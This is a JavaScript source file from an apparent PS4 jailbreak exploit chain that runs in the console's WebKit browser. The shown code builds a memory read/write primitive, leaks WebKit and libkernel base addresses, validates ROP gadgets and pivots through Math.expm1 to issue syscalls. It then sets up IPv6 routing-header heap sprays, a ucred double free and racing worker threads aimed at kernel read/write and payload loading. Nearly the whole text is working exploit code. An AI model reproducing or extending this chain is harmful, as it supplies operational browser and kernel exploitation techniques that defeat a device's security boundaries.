import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { createContext, layoutContext, forceYield } from "./module/rop.js";
import { validateGadgets, discoverStubs } from "./module/gadgets.js";
import { loadPayload, kpatchPath, loadBinary, kpatchJmpSites } from "./module/assets.js";
import { checkJailbroken } from "./check-jailbroken.js";
import { runChain, mark, state, check, trace, hx, checkCounts, hexBytes, makePrimitiveProgress } from "./module/log.js";
import { makeRpc } from "./workers.js";
import { COMMON, NETCTRL as C, NETCTRL_SYS } from "./module/constants.js";
import { isKernelPtr, isKernelPtrAligned, isPtrish, isPlausibleBase, sameI64, } from "./module/addr.js";
import { bufferAddress, syscallResult } from "./module/syscall.js";
import { resolvePthreadCreate as resolvePthreadCreateShared, readSysentEntry, writeSysentEntry, armSysentEntry, readByte, isGateableJumpByte, mapRwxAtFixedAddress, KEXEC_MAP_LO, KEXEC_MAP_HI, copyBlobToKernel, mapAnonymousRwx, launchThread } from "./post-exploit.js";

const SYS = NETCTRL_SYS;

/*
FIRMWARE RESOLVER.

offsetsFor() lives in main.js now -- it is app wiring, and offset.js is pure
data. main.js imports PS4 from ./offset.js, builds the resolver and publishes
it as window.offsetsFor BEFORE it calls mod.run(), so by the time this chain
runs the global is present. Same wrapper as lapse.js, so both chains fail with
one clear message if the global is ever missing.
*/
function offsetsFor(ua) {
    if (typeof window === "undefined" || typeof window.offsetsFor !== "function")
        throw new Error("offsetsFor is not installed -- main.js must run before "
            + "the exploit chain (it publishes window.offsetsFor from the PS4 "
            + "table in src/offset.js)");
    return window.offsetsFor(ua);
}

/* hexByte/hexBytes now imported from ./module/log.js */
const { AF_UNIX, SOCK_STREAM, UCRED_SIZE, KQUEUE_SIZE, NUM_UIO_IOV, UIO_SIZE,
    IOVEC_SIZE, MSGHDR_SIZE, NUM_MSG_IOV, AF_INET6, IPPROTO_IPV6, IPV6_RTHDR,
    IP6_RTHDR0_SIZE, IN6_ADDR_SIZE, SOL_SOCKET, RTP, RTP_SET,
    RTP_PRIO_REALTIME, MAIN_CORE, CPU_LEVEL_WHICH, CPU_WHICH_TID,
    JSVALUE_UNDEFINED } = { ...C, ...COMMON };

/*
Logging layer is shared with lapse.js (ps4/log.js). netctrl's
   differences from lapse's defaults are all init options here: it posts the
   RAW detail (not the terse one) under prefix PS4-S10, and it highlights a
   different tag vocabulary (REBOOT/MISS/LOST/POISON/ABORTED/REFUSED/...).
*/
export function run(options) {
    return runChain({
        ...options,
        postPrefix: "PS4-S10",
        postRawDetail: true,
        badRe: /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i,
        warnRe: /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i,
        okRe: /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i,
    }, runOriginal);
}

const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const NUM_LEAK_KQUEUE = 5000;

const KQ_HDR_MAGIC = 0x1430000;
// NUM_UIO_IOV / UIO_SIZE come from constants.js (NETCTRL_SYS).
const NUM_UIO_SPRAY = 10000;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SO_SNDBUF = 0x1001;

const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const NUM_IPV6_SOCK = 0x100;

const RTHDR_TAG = 0x13370000;
const MAX_ROUNDS_TWIN = 10, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;

/*
Bounded-join budget (ms). The UIO racer tasks are fireW(..., 0) -- no RPC
timeout -- so a batch where every racer parked would hang the stage forever.
boundedJoin() gives up after this and reports it as JOIN-TIMEOUT, letting the
kread/kwrite retry paths take over. Override with ?joinms=.
*/
const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;

const keepAlive = [];
const workers = [];

let kreadPoisoned = false;
let uafSock = 0;
let uafFpSaved = null;
let restoreCtx = null;

let allDone = false;

let payloadRan = false;

/*
================================================================================
DRIVER STATE
================================================================================

Everything the stages share lives here, at module scope, exactly as lapse.js
keeps its per-run handles. The stages below are plain functions that read and
write these; the orchestrator at the bottom of this file calls them in order.

Before this split the whole chain was one runOriginal() body and every one of
these was a `const` local inside it, which is why nothing could be named or
tested. The values and their initialisers are unchanged -- this is a move, not
a rewrite.
*/
let p = null;                       // the userland primitive (mem.js)
let off = null, key = null;         // firmware offsets + the UA key they came from
let G = null, M = null;             // gadget table, ROP context
let argGadget = null;               // arg-register gadget ladder for fireW/callAddr
let sc = null, callAddr = null;     // call gate + "call syscall N through it"
let errno = null;
let stubAddr = null, errorFn = null;
let webkitBase = null, libkernelBase = null, pid = 0;
let bufAddr = null;
let KPATCH_JMP_SITES = [];

/* SI-armed stage 0 objects. Held here because stageTeardown and the kread/
   kwrite helpers all reach them. */
let scratch = 0, argAddr = 0, argDv = null;
let lenAddr = 0, lenDv = null;
let sprayAddr = 0, sprayDv = null, sprayLen = 0;
let leakAddr = 0, leakDv = null, leakU8 = null;
let shortReads = 0;
let iovSs = [], uioSs = [], masterPipe = [], slavePipe = [];
let iovAddr = 0, msgAddr = 0, iovDv = null, msgDv = null;
/*
DRIVER SCOPE, and the ArrayBuffers must be here with them. The addr/DataView
pairs below were already hoisted, but iovAb/msgAb were `const` in
stagePrimitive -- and fakeUio()/restoreRefcntIov() (makeKarwHelpers, stage 7)
close over them. Same bug as argGadget, one stage later: the chain reached
SHORT-READS, then died on the FIRST forged-uio write with
"Can't find variable: iovAb". Kept alive by keepAlive, so only the binding moves.
*/
let iovAb = null, msgAb = null;
let uioIovAddr = 0, uioIovDv = null, uioIovAb = null;
let prioAddr = 0, maskAddr = 0, prioDv = null, maskDv = null;
let ipv6 = [];
let iovWorkers = [], uioWorkers = [];
let NUM_IOV_WORKER = 4, NUM_UIO_WORKER = 4, NUM_ATTEMPT = 8, NUM_IOV_SPRAY = 0x100;
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;
let kpatch = null, payload = null;
let twins = null, triplets = null;
let kernelBase = null, kqFdp = null, kqFd = -1;
let kv = null;
let fm = null;                      // stageMakeKarw's carrier / fds
/*
Shared rthdr / netcontrol helpers. These were inner functions of runOriginal
and are now driver-scope so the stages below can call them; the bodies are
unchanged (buildRthdr was already hoisted -- it is a function declaration).
*/
let setRthdr = null, freeRthdr = null, getRthdr = null;
let netevent = null;
let burn = null;
let fireW = null, readTag = null, tagFor = null;
let fakeUio = null, restoreRefcntIov = null, setUioIov = null;
let tripletsUsable = null, tripletsAgree = null, refindPair = null;
let refindTriplets = null, unwind = null;
let landUio = null, landFakeUio = null, releaseIov = null;
let restoreThreadAttrs = null;
let boundedJoin = null;             // implemented below, with put/buildRthdr
let kreadSlow = null, kwriteSlow = null;
let findTwins = null, findTriplet = null;
let bootFingerprint = null;
let bootErr = "";
let boot = null;
let R1_ON = true;
const burned = new Set();
let savedMask = null, savedPrio = null, attrsRestored = false;

/*
Parameters that used to be read where they were used, hoisted so the stage
functions can see them. Same defaults, same ?param= spelling.
*/
/*
Two helpers the stages share. put() writes an int64-or-number into a DataView at
a byte offset; buildRthdr() lays the IPV6_RTHDR0 header into a buffer and returns
the length the kernel will actually copy. Both bodies are unchanged.
*/
function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}

function buildRthdr(dv, size) {
    const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
    new Uint8Array(dv.buffer).fill(0);
    dv.setUint8(0, 0); dv.setUint8(1, n * 2);
    dv.setUint8(2, 0); dv.setUint8(3, n);
    return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
}
/*
BOUNDED JOIN for the racer batches.

tasks[] are fireW(..., 0) RPCs -- deliberately NO RPC timeout, because the
spray loops EXPECT most racers to park in the kernel (that parking IS the
race). So `await Promise.all(tasks)` can never be allowed to wait for ever:
if every racer in a batch parks, the promise never settles and the stage
wedges with the main thread still realtime-pinned -- the indefinite hang
that needs a manual reboot.

This resolves after at most `ms` and returns how many were still
outstanding, so the caller can retry (kread8/kwrite8n have KREAD_TRIES) or
poison instead of hanging. The racers are NOT cancelled -- they may still
complete on the worker side; we simply stop waiting.

MODULE SCOPE, not inside makeKarwHelpers. stageTripleFree runs BEFORE that
helper, so leaving the assignment inside it made every join in the triple
free call `null`:
    STEP10-FAILED  boundedJoin is not a function
Keep it here, alongside put() and buildRthdr().
*/
boundedJoin = async function (tasks, ms, label) {
    if (!tasks || !tasks.length) return 0;
    /*
    NO setTimeout BACKSTOP. That was the last bug.

    This used to race an aggregate promise against a setTimeout. The log
    showed the race never resolving: the four uio racers are wedged inside
    writev and they STARVE THE MAIN THREAD'S TASK QUEUE, so a short timer --
    itself just a task -- never fires. Same starvation that stalled
    yieldMacrotask() one wrapper earlier. A timer cannot bound a wait when
    timers are not being delivered.

    So bound it by POLLING Date.now(), which advances whether or not the
    queue drains, and yield between polls. No Promise.all either: that left
    the four RPC promises pending for ever and did not cancel them.
    */
    const deadline = Date.now() + ms;
    const settledFlags = new Array(tasks.length).fill(false);
    for (let i = 0; i < tasks.length; ++i) {
        const idx = i;                    // capture per iteration
        Promise.resolve(tasks[idx]).then(
            function () { settledFlags[idx] = true; },
            function () { settledFlags[idx] = true; });
    }
    while (Date.now() < deadline) {
        let out = 0;
        for (let i = 0; i < settledFlags.length; ++i)
            if (!settledFlags[i]) out++;
        if (out === 0) return 0;
        await yieldOnce();
    }
    let outstanding = 0;
    for (let i = 0; i < settledFlags.length; ++i)
        if (!settledFlags[i]) outstanding++;
    if (outstanding > 0)
        mark("JOIN-TIMEOUT", label + " "
            + outstanding + "/" + tasks.length
            + " parked after " + ms + " ms");
    return outstanding;
};

/*
A yield that cannot itself hang: whichever of a MessageChannel macrotask or a
short timer arrives FIRST wins. Same shape as rop.js yieldFrame, kept local so
this file gains no import cycle and does not share the ROP module's counter.
If MessageChannel is unavailable the timer alone carries it.
*/
function yieldOnce() {
    return new Promise(function (resolve) {
        let done = false;
        const finish = function () {
            if (!done) { done = true; resolve(); }
        };
        const t = setTimeout(finish, 2);
        try {
            const ch = new MessageChannel();
            ch.port1.onmessage = function () { clearTimeout(t); finish(); };
            ch.port2.postMessage(0);
        } catch (e) {
            /* MessageChannel unavailable: the timer above is the only path. */
        }
    });
}


const JOIN_MS = params.has("joinms") ? parseInt(params.get("joinms"), 10) : 5000;
const R2_ON = params.get("r2") !== "0";
const PAIR_ON = params.get("pair") === "1";
const SWEEP_CYCLES = params.has("sweep") ? parseInt(params.get("sweep"), 10) : 6;
const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 60;
const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 8;

/*
================================================================================
STAGE 1: stagePrimitive -- firmware, blobs, the userland primitive, the ROP gate
================================================================================

Was the first ~250 lines of runOriginal's body. Returns false where the old body
`return`ed bare, so the orchestrator can report the same reason string; the one
early exit that carried its own payload (already-jailbroken) is reported through
primitiveFail, exactly as lapse.js does it.
*/
let primitiveFail = null;

async function stagePrimitive(options) {
    NUM_IOV_WORKER = params.has("iov") ? parseInt(params.get("iov"), 10) : 4;
    NUM_ATTEMPT = params.has("attempts") ? parseInt(params.get("attempts"), 10) : 8;
    NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x100;

    const resolved = offsetsFor(navigator.userAgent);
    key = resolved.key;
    off = resolved.off;
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
        state("no offsets for this firmware", "bad");
        primitiveFail = "unsupported-firmware";
        return false;
    }
    mark("FW-STATUS", off.fw_status || "none");
    mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
        + " spray=" + NUM_IOV_SPRAY
        + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));

    const kpatchName = kpatchPath(key, off);
    try {
        kpatch = await loadBinary(kpatchName);
    } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
    if (kpatch) KPATCH_JMP_SITES = kpatchJmpSites(kpatch);
    mark("KPATCH-BLOB", kpatch
        ? "blob=" + kpatchName + " bytes=" + kpatch.length
        + " sites=" + KPATCH_JMP_SITES.length
        : "blob=" + kpatchName + " MISSING");
    /*
    options.payload is the UI selection (goldhen.bin / hen.bin).
    runChain passes the options object through to runOriginal, but this
    function used to take no parameter and drop it -- so loadPayload()
    fell back to its "payload.bin" default, which deliberately does not
    ship, and the whole payload stage was skipped (success=false).
    */
    try {
        payload = await loadPayload(options.payload);
    } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
    mark("PAYLOAD-BLOB", payload
        ? "bytes=" + payload.length + " entry="
        + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
        : "MISSING");

    state("running the primitive...", "warn");
    await new Promise(r => setTimeout(r, 0));

        /*
        USERLAND UX. Was: only FAIL/ERROR/THREW/RETRY/ABORT/PASS reached the
        log, everything else went to the XHR only, so a normal multi-attempt
        groom looked like a frozen "running the primitive..." with a few
        AUTO-RETRY lines. makePrimitiveProgress gives a live attempt N/M
        status and a bounded set of phase/retry marks instead.
        */
        const progress = makePrimitiveProgress(6);
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: progress.onEvent
        });
        progress.done("ok");

        /*
        THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
        proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
        only NULLS references; it does not free anything. It converts 137 MB
        of quiet pinned memory into 137 MB of garbage and leaves the sweep to
        JSC, which last time chose to run it somewhere inside the triple-free
        race ~500 ms later (cr_refcnt-driven-1 rounds=256, twice).

        So: release it HERE, then make the collection happen HERE too, before
        a single worker or kernel object exists.
        OPT-IN, not opt-out. Promotion releases the ~137 MB -- but releasing
        is not freeing: it turns quiet pinned memory into garbage that JSC
        collects whenever it chooses, including mid-race. The sweep below was
        meant to force that collection at a safe point and MEASURABLY DOES
        NOT: 21 consecutive runs logged worst_cycle_ms 67-83 against a 60 ms
        floor, i.e. a few ms of overhead and no full collection anywhere.
        Until the sweep can be shown to actually collect, the pinned profile
        is the safer one. ?pair=1 to experiment.
        */
        installWindowP(carrier, {
            promote: PAIR_ON,
            onEvent: progress.onEvent
        });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + " stage=" + pairStatus.stage
            + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
            + (pairStatus.error ? " error=" + pairStatus.error : ""));

        /*
        Provoke the collection. globalThis.gc does not exist in a shipping
        WebProcess (core.js:368 guards for it and never fires), so the only
        levers are allocation pressure and turning the event loop -- the
        incremental sweeper cannot run while we hold the thread.

        OBSERVABLE: worst_cycle_ms. A cycle much longer than floor_ms is a
        collection landing here instead of on the race. If every cycle sits
        at the floor, nothing was swept and this experiment did nothing.
        */
        if (pairStatus.promoted && SWEEP_CYCLES > 0) {
            state("sweeping...", "warn");
            const t0 = Date.now();
            let worst = 0;
            for (let i = 0; i < SWEEP_CYCLES; ++i) {
                const c0 = Date.now();
                let junk = [];
                for (let k = 0; k < SWEEP_MB; ++k)
                    junk.push(new ArrayBuffer(0x100000));
                junk.length = 0; junk = null;
                await new Promise(r => setTimeout(r, SWEEP_MS));
                const dt = Date.now() - c0;
                if (dt > worst) worst = dt;
            }
            mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB
                + " floor_ms=" + SWEEP_MS + " worst_cycle_ms=" + worst
                + " total_ms=" + (Date.now() - t0));
        } else {
            mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
                + " cycles=" + SWEEP_CYCLES);
        }
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = isPlausibleBase;   // module/addr.js
        if (!check("module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase), "")) return false;

        /*
        Shared gadget validation (ps4/gadgets.js) -- same definitions and
        read discipline as lapse's; netctrl's G0..G5 pivot gadgets are the
        rebasable entries in the table.
        */
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30], true],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07], true],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5], true],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08], true],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp], true],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3], true],
        ];
        const gv = validateGadgets(p, webkitBase, GAD, hexBytes, mark);
        G = gv.gadgets;
        if (!check("gadget-table-fits-module", !gv.fatal,
            gv.gated + "/" + gv.total)) return false;
        /*
        DRIVER SCOPE, not a local. fireW() -- defined in stageThreadAttrs,
        which runs AFTER stagePrimitive returns -- closes over this, and the
        old `const` here was function-scoped to stagePrimitive. So every RPC
        that went through fireW threw "Can't find variable: argGadget" the
        moment it was called, which is the STEP10-FAILED right after
        main-thread-pinned-realtime: the worker-attrs restore pass is the
        FIRST fireW caller in the chain.
        */
        argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
        G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        /*
        Shared syscall stub discovery (ps4/gadgets.js) -- identical seed-then-
        scan as lapse's, no requirePlain here so netctrl keeps tolerating
        wrapper stubs exactly as before.
        */
        const disc = discoverStubs(p, libkernelBase, off, SYS);
        stubAddr = disc.stubAddr;
        mark("STUBS", "seeded=" + disc.seeded + " scanned=" + disc.scanned);
        if (!check("syscall-page-needs-stub", disc.missing.length === 0,
            disc.missing.join(","))) return false;

        bufAddr = ab => bufferAddress(p, off, ab);   // module/syscall.js
        put = function (dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                        dv.setUint32(at + 4, v.hi >>> 0, true);
                    }
                };
                /*
                Shared ROP context builder (ps4/rop.js) -- identical to lapse's.
                */
        // eslint-disable-next-line no-func-assign
        M = createContext({ p, offsets: off, gadgets: G, keepAlive });
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;
        callAddr = function (target, args) {
            layoutContext(M, off, G, argGadget, JSVALUE_UNDEFINED, target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            /* module/syscall.js: { lo, hi, i32 } from frame offsets 0 and 4. */
            return syscallResult(M.frameDv);
        };
        sc = (num, ...a) => callAddr(stubAddr.get(num), a);
        errno = function () {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        };
        pid = sc(SYS.getpid).i32;
        const uid = sc(SYS.getuid).i32;
        const euid = sc(SYS.geteuid).i32;
        check("chain-reaches-kernel", pid > 0,
            "pid=" + pid + " uid=" + uid + " euid=" + euid);
        const jb = checkJailbroken({ sc, sys: SYS, mark, state });
        if (jb.alreadyJailbroken) {
            primitiveFail = "already-jailbroken";
            return false;
        }

        const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
        scratch = bufAddr(scratchAb);
        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        argAddr = bufAddr(argAb); argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(8); keepAlive.push(lenAb);
        lenAddr = bufAddr(lenAb); lenDv = new DataView(lenAb);
        const sprayAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(sprayAb);
        sprayAddr = bufAddr(sprayAb); sprayDv = new DataView(sprayAb);
        const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
        leakAddr = bufAddr(leakAb); leakDv = new DataView(leakAb);

        /*
        R2. getsockopt(IPV6_RTHDR) can copy out FEWER bytes than asked, and
        every reader below then parses whatever the PREVIOUS call left in the
        buffer. poops.js:1849 uses the same 0xee sentinel. Filling only the
        requested window keeps this proportional to the copy already being
        made -- this runs inside the spray loops.
        */
        leakU8 = new Uint8Array(leakAb);
        shortReads = 0;

        /*
        ITEM 6(a). THE BURN LIST. After a double free, the sockets whose
        rthdr aliases the freed ucred must never be touched again. The lethal
        operation is setRthdr: on a socket that already owns an rthdr it is a
        free-then-realloc, so re-spraying a burned socket FREES the aliased
        chunk and leaves the other owner dangling. freeRthdr and close are
        equally fatal. A burned fd is therefore excluded from every spray,
        every scan, and the teardown close -- until kernel R/W can repair it.
       */
        burn = function (fd, why) {
            if (fd > 0 && !burned.has(fd)) {
                burned.add(fd);
                mark("BURNED", "fd=" + fd + " why=" + why + " total=" + burned.size);
            }
        };

        sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
        setRthdr = s => sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
            sprayAddr, sprayLen).i32;
        freeRthdr = s => {
            /*
            ITEM 6(a) chokepoint. The other guards filter at SELECTION time
            (findTwins/findTriplet never hand back a burned fd). This is the
            structural one: even if a future edit lets a burned fd through,
            the free that would make it a double free cannot happen.
            */
            if (burned.has(s)) {
                mark("FREERTHDR-REFUSED", "fd=" + s + " is burned");
                return -1;
            }
            return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
        };

        /*
        `need` = the highest byte offset the CALLER will actually parse. A
        copyout shorter than that is reported as -1 rather than handing back
        the previous call's bytes. No mark() here -- this is a hot path; the
        count is reported once at make_karw.
        */
        getRthdr = function (s, size, need) {
            if (R2_ON) leakU8.fill(0xee, 0, size);
            lenDv.setUint32(0, size, true);
            const rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                leakAddr, lenAddr).i32;
            if (rv !== 0) return -1;
            const got = lenDv.getUint32(0, true);
            if (R2_ON && need !== undefined && got < need) { shortReads++; return -1; }
            return got;
        };
        netevent = function (sock, event) {
            argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        };

        iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
        msgAb = new ArrayBuffer(MSGHDR_SIZE);
        keepAlive.push(iovAb, msgAb);
        iovAddr = bufAddr(iovAb); msgAddr = bufAddr(msgAb);
        iovDv = new DataView(iovAb); msgDv = new DataView(msgAb);

        new Uint8Array(iovAb).fill(0);
        put(iovDv, 0, 1);
        put(iovDv, 8, 1);
        new Uint8Array(msgAb).fill(0);
        put(msgDv, 0x10, iovAddr);
        msgDv.setInt32(0x18, NUM_MSG_IOV, true);

                state("setting up...", "warn");
                if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
                    throw new Error("socketpair failed");
                iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
                if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
                    throw new Error("uio socketpair failed");
                uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
                mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));

                /*
                SEND SIDES NON-BLOCKING, set ONCE here, for the whole run.

                sc() is a SYNCHRONOUS ROP syscall on the main JS thread, so any
                main-thread write to these sockets can sleep in the kernel and
                take the whole chain with it -- that is the silent stop after
                KWRITE-BEGIN, and unwind()'s comment calls it "the ONLY
                UNBOUNDED BLOCK IN THIS FILE". Setting O_NONBLOCK at creation
                means no caller has to remember it, and no path can flip it
                back mid-run underneath racers that are parked in the kernel.

                ONLY [1] (the write end). The read ends stay BLOCKING on
                purpose: the racer workers read from them and must park -- that
                parking IS the race, and it is what cr_refcnt-driven-1 depends
                on. The racers' own writev/readv calls run on the worker
                threads, which have their own stacks and are allowed to block.
                */
                sc(SYS.fcntl, iovSs[1], F_SETFL, O_NONBLOCK);
                sc(SYS.fcntl, uioSs[1], F_SETFL, O_NONBLOCK);

                if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
                masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
                if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
                slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
                check("karw-pipe-pairs-exist",
                    masterPipe[0] > 0 && masterPipe[1] > 0
                    && slavePipe[0] > 0 && slavePipe[1] > 0,
                    "master " + masterPipe + "  slave " + slavePipe);

                const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
                new Uint8Array(dummyAb).fill(0x41);
                const dummyAddr = bufAddr(dummyAb);
                uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
                keepAlive.push(uioIovAb);
                uioIovAddr = bufAddr(uioIovAb); uioIovDv = new DataView(uioIovAb);

                new Uint8Array(uioIovAb).fill(0);
                put(uioIovDv, 0, dummyAddr);
                ipv6 = [];
                for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
                    const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
                    if (s === -1) break;
                    ipv6.push(s);
                }
                check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
                    ipv6.length + "/" + NUM_IPV6_SOCK);
        return true;
}

/*
STAGE 2: stageWorkers -- the RPC pool, pinned and armed
Each worker is a separate JS realm that builds its OWN userland primitive
(init), transfers a marker buffer out so we can walk to its objects from here,
and arms its own Math.expm1 call gate (armPivot). fire() then runs a ROP chain
on that thread -- which is what gives the race its concurrency.
*/
async function stageWorkers() {
                /*
                Shared worker RPC (workers.js) -- netctrl's superset version with
                labelled errors and a per-call timeoutMs (0 = no timeout).
                */
                const ptrish = isPtrish;   // module/addr.js
                NUM_UIO_WORKER = params.has("uio") ? parseInt(params.get("uio"), 10) : 4;
                const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
                state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
                for (let i = 0; i < TOTAL_WORKERS; ++i) {
                    const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                        + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
                    const w = { name: name, armed: false, wired: false };
                    workers.push(w);
            w.worker = new Worker("src/worker.js");
            w.rpc = makeRpc(w.worker, name, undefined, (n, msg) => mark("WORKER-ONERROR", n + " " + msg));
            if ((await w.rpc("ping", 15000)) !== "pong")
                throw new Error(name + " did not answer ping");
            const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
            const arr = await w.rpc("init", 15000, sLo, sHi);
            keepAlive.push(arr);
            const D = bufAddr(arr.buffer);
            if ((p.read4(D) >>> 0) !== sLo)
                throw new Error(name + ": transfer did not preserve the store");
            const storage = p.read8(D.add32(0x10));
            const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
            if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
            const bf = p.read8(mc.add32(8));
            let wm = null, wv = null, wl = null;
            for (let k = 1; k <= 8; ++k) {
                const val = p.read8(bf.sub32(8 * k));
                if (!ptrish(val)) continue;
                const inl = p.read8(val.add32(0x10));
                const len = p.read4(val.add32(0x18)) >>> 0;
                if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
                else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
            }
